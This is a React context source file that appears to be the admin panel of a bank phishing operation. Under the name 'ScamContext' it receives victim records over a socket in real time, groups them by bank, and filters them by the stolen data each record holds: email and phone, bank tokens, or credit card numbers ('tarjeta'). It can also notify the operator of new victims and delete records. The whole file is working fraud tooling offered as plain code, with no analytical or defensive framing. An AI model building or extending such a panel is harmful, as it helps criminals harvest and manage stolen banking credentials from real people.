
import React, { useContext, useEffect, useState } from 'react';
import { createContext } from 'react';
import { SocketContext } from './SocketContext';


export const ScamContext = createContext();

export const ScamProvider = ({ children }) => {

    const { socket } = useContext(SocketContext);

    const [ usersAll, setUsersAll ] = useState([{}]);
    const [ users, setUsers ]       = useState([{}]);
    const [ scamName, setScamName ] = useState([]);
    const [ selected, setSelected]  = useState([])
    const [ filteredType, setFilteredType] = useState('all')

    const [notification, setNotification] = useState(false);

    useEffect(() => {

        socket.emit('[User] getAll')
        socket.on('[User] emitAll', (usuarios) => {
            setUsersAll(usuarios)
        });
    // eslint-disable-next-line
    }, []);

    socket.on('[User] newUser', (usuario) => {
        
        let existUpdate = false;
        const newUsers = usersAll.map(e => {
            if(e._id === usuario._id){
                existUpdate = true
                return e = usuario;
            }
            return e;
        })

        
        
        if(!existUpdate) {
            setNotification(true)
            return setUsersAll([...users, usuario])
        };
        setNotification(true)
        return setUsersAll(newUsers)
    });
        

    useEffect(() => {
        usersAll.reduce((acc, item) => {
            if(!acc.includes(item.name)){
                acc.push(item.name)
                setSelected(acc[0])
            }
            setScamName(acc)
            return acc
        // eslint-disable-next-line
        }, [])

    }, [usersAll]);
        
    useEffect(() => {
            // eslint-disable-next-line
            const usersFilter = usersAll.filter( user => {
    
                const existBank = user.name === selected ;
                console.log(filteredType)
                const existEmail = existBank && filteredType === 'emailAndPhone';
                const existToken = existBank && filteredType === 'token';
                const existCard  = existBank && filteredType === 'creditCard';
                const all        = existBank && filteredType === 'all';
                
                
                if( existEmail && user.correo !== undefined && user.celular !== undefined ) return user;
                
                if( existToken && (user.token1 !== undefined || user.token2 !== undefined)  ) return user;
                
                if( existCard && (user.tarjeta !== undefined) ) return user;
                
                if(all) return user

            })

            setUsers(usersFilter)
            
    }, [selected, filteredType, usersAll]);

    const deleteUser = ({_id}) => {
        socket.emit('[User] delete', {_id})

        const arrDeleteUser = users.filter(user => user._id !== _id )
        setUsersAll(arrDeleteUser)
    }


    return (
        <ScamContext.Provider value={{ 
            scamName, 
            selected, 
            setSelected,
            users,
            filteredType, 
            setFilteredType,
            deleteUser,
            notification,
            setNotification
        }}>
            { children }
        </ScamContext.Provider>
    )
}